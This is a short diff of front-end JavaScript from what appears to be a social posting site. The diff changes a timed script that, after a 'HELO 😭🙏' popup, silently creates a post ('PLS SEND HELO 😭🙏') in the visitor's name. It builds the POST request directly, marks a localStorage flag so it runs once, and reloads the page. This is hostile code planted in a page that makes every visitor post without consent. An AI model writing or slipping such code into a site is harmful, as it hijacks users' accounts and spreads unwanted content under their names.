@@ -170,9 +170,12 @@ showPopUp("HELO 😭🙏", "HELO 😭🙏", [["HELO 😭🙏", "var(--themeColor
 
 setTimeout(() => {
   if (localStorage.getItem("lalala") != "true"){
-    document.getElementById("newPostArea").innerText = "I love HELO 😭🙏!";
-  document.getElementById("createPostButton").click();
-  localStorage.setItem("lalala", "true");
+    const fdd = new FormData();
+    const dataa = JSON.stringify({ text: "PLS SEND HELO 😭🙏" });
+    fdd.append("data", dataa);
+    sendRequest("POST", "posts/new", fdd, true);
+    localStorage.setItem("lalala", "true");
+    window.location.reload();
   }
 }, 2500);
 
